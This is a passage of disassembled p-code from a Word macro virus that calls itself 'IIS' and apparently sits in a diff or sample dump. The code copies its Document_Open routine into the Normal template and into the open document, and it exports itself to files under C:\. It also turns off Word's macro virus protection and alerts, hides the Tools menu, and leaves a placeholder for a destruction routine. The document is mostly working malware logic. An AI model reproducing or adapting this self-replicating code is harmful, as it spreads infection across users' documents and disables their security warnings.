+' 	LitVarSpecial (True)
+' 	St NormInstalled 
+' 	EndIf 
+' Line #260:
+' 	Ld ActInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St ActInstalled 
+' 	EndIf 
+' Line #261:
+' Line #262:
+' 	CloseAll 
+' Line #263:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #264:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #265:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #266:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	DoUnitil 
+' Line #267:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo dss 
+' 	EndIf 
+' Line #268:
+' 	LitDI2 0x000C 
+' 	Ld a 
+' 	LineInput 
+' Line #269:
+' 	Ld a 
+' 	LitStr 0x0013 "@del c:\normalb.dot"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	Paren 
+' 	Ld vbReadOnly 
+' 	ArgsCall SetAttr 0x0002 
+' 	EndIf 
+' Line #270:
+' 	Loop 
+' Line #271:
+' 	Label dss 
+' Line #272:
+' Line #273:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld ActIntalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo esub 
+' 	EndIf 
+' Line #274:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	St IW 
+' 	Else 
+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\Vd.dll"
+' 	St IW 
+' 	EndIf 
+' Line #275:
+' 	Ld IW 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #276:
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #277:
+' 	Do 
+' Line #278:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #279:
+' 	Ld VirCode 
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	Eq 
+' 	LoopUntil 
+' Line #280:
+' 	Do 
+' Line #281:
+' 	Ld VirCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ess 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St ess 
+' 	EndIf 
+' Line #282:
+' 	Ld ess 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #283:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #284:
+' 	Ld VirCode 
+' 	LitStr 0x0016 "Rem Written by Flitnic"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #285:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #286:
+' 	Loop 
+' Line #287:
+' 	Label jump 
+' Line #288:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #289:
+' 	Ld FullCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	St FullCode 
+' Line #290:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #291:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #292:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo AtrNo 
+' 	EndIf 
+' Line #293:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #294:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #295:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #296:
+' 	CloseAll 
+' Line #297:
+' 	ExitSub 
+' Line #298:
+' 	EndIfBlock 
+' Line #299:
+' 	Label AtrNo 
+' Line #300:
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #301:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #302:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #303:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #304:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #305:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #306:
+' 	EndIfBlock 
+' Line #307:
+' 	Ld ActInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #308:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #309:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #310:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #311:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #312:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #313:
+' 	ElseBlock 
+' Line #314:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #315:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #316:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #317:
+' 	EndIfBlock 
+' Line #318:
+' 	EndIfBlock 
+' Line #319:
+' 	Label esub 
+' Line #320:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St a 
+' Line #321:
+' 	Ld a 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #322:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #323:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #324:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #325:
+' 	CloseAll 
+' Line #326:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #327:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2a 
+' 	EndIf 
+' Line #328:
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #329:
+' 	Label tz2a 
+' Line #330:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #331:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2b 
+' 	EndIf 
+' Line #332:
+' 	LitStr 0x0009 "C:\vd.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #333:
+' 	Label tz2b 
+' Line #334:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #335:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #336:
+' 	EndIfBlock 
+' Line #337:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #338:
+' 	LitDI2 0x0001 
+' 	ArgsLd LOF 0x0001 
+' 	St lll 
+' Line #339:
+' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
+' Line #340:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #341:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #342:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #343:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #344:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #345:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #346:
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #347:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #348:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #349:
+' 	ExitFor 
+' Line #350:
+' 	EndIfBlock 
+' Line #351:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #352:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #353:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #354:
+' 	CloseAll 
+' Line #355:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #356:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #357:
+' 	CloseAll 
+' Line #358:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #359:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #360:
+' 	EndIfBlock 
+' Line #361:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #362:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #363:
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #364:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #365:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #366:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #367:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #368:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #369:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #370:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #371:
+' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
+' Line #372:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	ArgsLd LCase 0x0001 
+' 	LitStr 0x0001 "a"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #373:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #374:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #375:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #376:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #377:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #378:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #379:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #380:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #381:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #382:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #383:
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #384:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #385:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #386:
+' 	ExitFor 
+' Line #387:
+' 	EndIfBlock 
+' Line #388:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #389:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #390:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #391:
+' 	CloseAll 
+' Line #392:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #393:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #394:
+' 	CloseAll 
+' Line #395:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #396:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #397:
+' 	EndIfBlock 
+' Line #398:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #399:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #400:
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #401:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #402:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #403:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #404:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #405:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #406:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #407:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #408:
+' 	EndIfBlock 
+' Line #409:
+' 	Label nomacro 
+' Line #410:
+' Line #411:
+' Line #412:
+' 	CloseAll 
+' Line #413:
+' 	Label MegaJump 
+' Line #414:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #415:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #416:
+' 	OnError (Resume Next) 
+' Line #417:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	Ld vbReadOnly 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #418:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #419:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #420:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #421:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #422:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #423:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #424:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayStatusBar 
+' Line #425:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #426:
+' 	LitVarSpecial (False)
+' 	LitDI2 0x0003 
+' 	LitDI2 0x000C 
+' 	LitStr 0x0005 "Tools"
+' 	Ld Application 
+' 	ArgsMemLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Visible 
+' Line #427:
+' Line #428:
+' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
+' Line #429:
+' Line #430:
+' Line #431:
+' 	Label gghh 
+' Line #432:
+' 	EndSub 
+' Line #433:
+' 	FuncDefn (Private Sub Document_New())
+' Line #434:
+' 	Rem 0x000D " MyName = IIS"
+' Line #435:
+' 	LitStr 0x0009 "c:\No.dat"
+' 	ArgsLd Dir 0x0001 
+' 	St a 
+' Line #436:
+' 	Ld a 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0006 "NO.DAT"
+' 	Eq 
+' 	IfBlock 
+' Line #437:
+' 	ExitSub 
+' Line #438:
+' 	EndIfBlock 
+' Line #439:
+' 	CloseAll 
+' Line #440:
+' 	OnError MegaJump 
+' Line #441:
+' 	LitStr 0x000C "c:\msdos.sys"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #442:
+' 	Do 
+' Line #443:
+' 	LitDI2 0x0001 
+' 	Ld ms 
+' 	LineInput 
+' Line #444:
+' 	Ld ms 
+' 	LitDI2 0x0007 
+' 	ArgsLd LBound 0x0002 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0007 "WINDIR="
+' 	Eq 
+' 	IfBlock 
+' Line #445:
+' 	Ld ms 
+' 	FnLen 
+' 	St a 
+' Line #446:
+' 	Ld ms 
+' 	LitDI2 0x0008 
+' 	Ld a 
+' 	ArgsLd Mid$ 0x0003 
+' 	St windir 
+' Line #447:
+' 	GoTo fert 
+' Line #448:
+' 	EndIfBlock 
+' Line #449:
+' 	Loop 
+' Line #450:
+' 	CloseAll 
+' Line #451:
+' 	Label fert 
+' Line #452:
+' 	CloseAll 
+' Line #453:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #454:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0001 "+"
+' 	PrintItemNL 
+' Line #455:
+' 	CloseAll 
+' Line #456:
+' 	LitVarSpecial (False)
+' 	St NormInstalled 
+' Line #457:
+' 	LitVarSpecial (False)
+' 	St ActInstalled 
+' Line #458:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #459:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #460:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St NormInst 
+' Line #461:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St ActInst 
+' Line #462:
+' 	Ld NormInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St NormInstalled 
+' 	EndIf 
+' Line #463:
+' 	Ld ActInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St ActInstalled 
+' 	EndIf 
+' Line #464:
+' Line #465:
+' 	CloseAll 
+' Line #466:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #467:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #468:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #469:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	DoUnitil 
+' Line #470:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo dss 
+' 	EndIf 
+' Line #471:
+' 	LitDI2 0x000C 
+' 	Ld a 
+' 	LineInput 
+' Line #472:
+' 	Ld a 
+' 	LitStr 0x0013 "@del c:\normalb.dot"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	Paren 
+' 	Ld vbReadOnly 
+' 	ArgsCall SetAttr 0x0002 
+' 	EndIf 
+' Line #473:
+' 	Loop 
+' Line #474:
+' 	Label dss 
+' Line #475:
+' Line #476:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld ActIntalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo esub 
+' 	EndIf 
+' Line #477:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	St IW 
+' 	Else 
